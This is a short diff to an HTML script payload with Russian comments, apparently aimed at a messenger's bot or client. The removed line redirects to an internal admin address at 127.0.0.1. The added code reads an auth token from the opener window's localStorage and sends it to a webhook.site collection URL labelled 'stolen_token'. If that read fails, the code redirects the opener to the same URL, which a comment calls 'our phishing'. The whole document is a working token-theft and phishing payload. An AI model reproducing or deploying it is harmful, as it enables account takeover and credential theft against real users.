@@ -1,4 +1,12 @@
 <script>
-  // Перенаправляем бота на внутреннюю админку или метаданные
-  window.location.href = "http://127.0.0.1:80/admin";
+    if (window.opener) {
+        // Пробуем дотянуться до localStorage мессенджера через окно-родитель
+        try {
+            var token = window.opener.localStorage.getItem('token');
+            fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen_token=' + token);
+        } catch(e) {
+            // Если мессенджер блокирует прямой доступ, пробуем редиректнуть его на наш фишинг
+            window.opener.location = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=" + btoa(e.message);
+        }
+    }
 </script>
